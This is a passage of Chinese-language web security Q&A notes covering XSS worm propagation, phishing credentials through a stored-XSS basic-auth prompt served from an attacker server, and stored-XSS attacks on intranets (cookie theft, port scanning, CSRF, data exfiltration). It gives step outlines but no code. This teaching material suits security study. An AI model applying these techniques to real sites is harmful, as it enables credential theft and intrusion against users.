<p class="md-end-block md-p"><span class="md-plain">XSS 蠕虫是一种具备自我复制和传播能力的跨站脚本攻击,通过 XSS 漏洞在用户之间自动扩散｡引发XSS 蠕虫的条件比较高,需要在用户之间发生交互行为的页面,这样才能形成有效的传播｡一般要同时结合 存储型 XSS(用于长期植入恶意代码)和反射型 XSS(用于诱骗点击)｡</span></p>
<p class="md-end-block md-p"><span class="md-plain">XSS 蠕虫传播过程可总结为以下步骤:</span></p>
<ol class="ol-list" start="">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">在目标网站的存储型 XSS 漏洞位置(如留言板)提交包含蠕虫脚本</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">蠕虫脚本生成伪装链接(如 “查看我的新动态”),利用目标网站的消息系统发送给用户好友</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">受害者点击链接,触发反射型 XSS,浏览器执行蠕虫脚本</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">蠕虫脚本获取受害者的好友列表,循环发送伪装链接,形成链式传播</span></p>
</li>
</ol>

<h3 class="md-end-block md-heading"><span class="md-plain">22. 听说可以用 XSS 钓鱼,是真的吗?</span></h3>
<p class="md-end-block md-p"><span class="md-plain">XSS 钓鱼是存在的，利用 XSS 漏洞在目标网站植入恶意脚本，通过伪造登录页面、弹出伪造对话框等方式，诱骗用户输入敏感信息（如账号密码），本质是结合跨站脚本与社会工程学的诈骗行为。 </span></p>
<p class="md-end-block md-p"><span class="md-plain">这里我简单讲一讲存在存储型 XSS 的页面如何利用basic认证实现钓鱼: </span></p>
<ol class="ol-list" start="">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">已知存在一个存在存储型 XSS 漏洞的页面 A 和攻击者后台 B </span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击这个可以利用该漏洞在 A 页面中内嵌一个请求（javascript或者其他） </span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">这个请求是向远端的服务器（攻击者后台）发起请求 </span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者后台返回一个要求他进行bacis认证的头部，在用户界面上就会弹出一个要进行身份认证的提示框</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">用户一旦他输入了账号密码，这个账号密码就会发送到攻击者后台 B</span></p>
</li>
</ol>

<h3 class="md-end-block md-heading"><span class="md-plain">24. 存储型 XSS 在纯内网环境中的利用</span></h3>
<p class="md-end-block md-p"><span class="md-plain">纯内网环境（无公网访问）中，存储型 XSS 可攻击内网用户及服务：</span></p>
<ul class="ul-list" data-mark="-">
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">横向渗透：窃取内网用户 Cookie，登录其他内网系统（如 OA、CRM）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">内网探测：通过脚本扫描内网端口（如</span><span class="md-pair-s" spellcheck="false"><code>192.168.1.1/24</code></span><span class="md-plain">），获取内网服务信息（如是否存在未授权数据库）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">发起内网 CSRF：利用 XSS 脚本伪造请求，攻击内网服务（如路由器配置修改、打印机劫持）；</span></p>
</li>
<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">窃取内网敏感数据：若页面包含内网文档（如员工工资表），脚本可自动爬取并发送到内网攻击者的服务器。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">25. CSRF 和 XSS 的区别</span></h3>
<p class="md-end-block md-p"><span class="md-plain">核心区别体现在攻击目标、原理和实现方式上：</span></p>
